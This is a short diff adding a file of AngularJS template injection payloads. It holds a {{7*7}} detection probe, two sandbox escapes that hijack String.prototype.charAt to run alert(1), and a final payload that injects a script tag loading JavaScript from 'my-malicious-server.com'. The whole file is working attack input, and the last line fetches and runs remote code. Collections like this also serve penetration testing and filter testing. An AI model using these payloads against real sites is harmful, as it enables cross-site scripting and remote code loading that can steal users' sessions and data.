@@ -1,0 +1,8 @@
+{{7*7}}
+{{a=toString().constructor.prototype;a.charAt=a.trim;$eval('a,alert(1),a')}}
+{{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1)//');}}
+{{
+    a=toString().constructor.prototype;a.charAt=a.trim;
+    $eval('a,eval(`var _=document.createElement(\'script\');
+    _.src=\'//my-malicious-server.com/mi-malicious-script.js\';document.body.appendChild(_);`),a')
+}}
